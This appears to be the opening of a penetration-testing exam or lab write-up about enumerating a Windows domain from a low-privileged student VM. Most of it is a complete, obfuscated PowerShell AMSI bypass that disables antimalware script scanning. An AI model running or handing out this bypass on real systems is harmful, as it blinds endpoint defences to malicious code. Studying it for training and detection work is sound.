# Enumeration StudentVM
**Domain Enumeration:**
I started the exam from the student VM machine which is lower privileged account on the current domain:
I have opened the powershell but not able to bypass the defender and not able to turn off the firewall. I 
have done an AMSI bypass and started with the enumeration further on the foothold Machine.
```
AMSI BYPASS: S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; (
Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}"
-f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( (
"{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' 
))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```
